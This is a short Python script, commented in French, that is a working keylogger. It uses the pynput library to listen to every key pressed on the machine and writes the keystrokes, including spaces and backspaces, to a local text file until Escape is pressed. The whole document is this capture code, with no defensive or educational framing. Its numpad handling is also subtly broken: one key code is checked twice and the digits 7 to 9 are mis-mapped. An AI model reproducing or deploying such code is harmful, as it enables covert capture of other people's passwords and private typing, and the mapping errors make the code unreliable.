from pynput import keyboard

####################################
#fonctions
####################################

def touche_pressee(key):
    print(key)
    try:
        fichier_code.write(key.char)

    except TypeError:
        chiffre = key
        if str(chiffre) == "<96>":
            fichier_code.write("0")

        elif str(chiffre) == "<97>":
            fichier_code.write("1")

        elif str(chiffre) == "<98>":
            fichier_code.write("2")

        elif str(chiffre) == "<99>":
            fichier_code.write("3")

        elif str(chiffre) == "<100>":
            fichier_code.write("4")

        elif str(chiffre) == "<101>":
            fichier_code.write("5")

        elif str(chiffre) == "<102>":
            fichier_code.write("6")

        elif str(chiffre) == "<97>":
            fichier_code.write("7")

        elif str(chiffre) == "<103>":
            fichier_code.write("8")

        elif str(chiffre) == "<104>":
            fichier_code.write("9")

    except AttributeError:
        if key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.space:
            fichier_code.write("\n")
        elif key == keyboard.Key.backspace:
            fichier_code.write("\nbackspace\n")

####################################
#corp
####################################

fichier_code = open("fichier.txt","w")

with keyboard.Listener(on_press=touche_pressee) as listener:
    listener.join()

fichier_code.close()